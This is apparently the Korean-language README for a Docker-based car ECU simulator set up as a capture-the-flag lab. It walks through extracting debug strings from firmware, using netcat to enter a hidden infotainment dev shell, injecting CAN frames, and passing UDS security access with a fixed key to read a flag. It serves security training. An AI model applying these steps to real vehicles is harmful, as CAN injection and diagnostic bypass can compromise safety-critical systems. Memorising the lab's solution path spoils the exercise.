# ECU Simulator Setup

## 빌드 및 배포

1. 먼저 custom CAN tools를 생성:
```bash
# Python 스크립트들을 실행 가능하게 만들기
chmod +x cansend.py candump.py can_broker.py
```

2. Docker 이미지 빌드:
```bash
./build_and_deploy.sh
```

3. 테스트 환경 실행:
```bash
docker-compose -f docker-compose.test.yml up -d
```

## 사용법

### 1단계: 펌웨어 분석
```bash
# 펌웨어 다운로드 후 문자열 추출
strings infotainment.bin | grep debug
```

### 2단계: 인포테인먼트 접근
```bash
# 인포테인먼트 시스템 접근
nc localhost 12340
> debug_enable_dev_mode
> dev_shell
```

### 3단계: CAN 네트워크 분석  
```bash
# 컨테이너 내부에서
candump vcan0 &
cansend vcan0 123#1234567890ABCDEF
```

### 4단계: 게이트웨이 인증
```bash
# 시드-키 인증
cansend vcan0 123#DEADBEEF12345678
```

### 5단계: 엔진 ECU 접근
```bash
# UDS 진단 세션 시작
cansend vcan0 7E0#1003

# 보안 접근
cansend vcan0 7E0#2701
cansend vcan0 7E0#2702CAFE

# 플래그 읽기
cansend vcan0 7E0#22F1A0
```
